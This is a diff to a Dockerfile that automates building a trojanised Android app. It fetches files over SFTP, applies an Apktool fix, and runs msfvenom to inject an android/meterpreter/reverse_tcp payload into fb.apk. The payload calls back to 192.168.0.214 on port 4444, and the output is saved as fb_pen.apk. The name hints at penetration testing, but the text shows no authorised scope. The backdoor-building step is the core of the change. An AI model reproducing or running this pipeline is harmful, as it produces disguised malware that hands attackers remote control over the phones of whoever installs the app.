@@ -33,8 +33,7 @@ RUN sudo python3 -m pip install pysftp
 
 RUN sudo /bin/bash -l -c 'sudo python3 /usr/src/wdir/P-Scripts/get_file_sftp.py'
 
+RUN sudo chmod 755 Apktool_Fix_Kali_2019/Apktool_Fix_Kali_2019.sh
 RUN sudo ./Apktool_Fix_Kali_2019/Apktool_Fix_Kali_2019.sh; exit 0
 
-RUN sudo /bin/bash -l -c 'msfvenom -x fb.apk -k -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > fb_pen.apk'; exit 0
-
-RUN ls -la
+RUN sudo /bin/bash -l -c 'msfvenom -x fb.apk -k -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > fb_pen.apk'
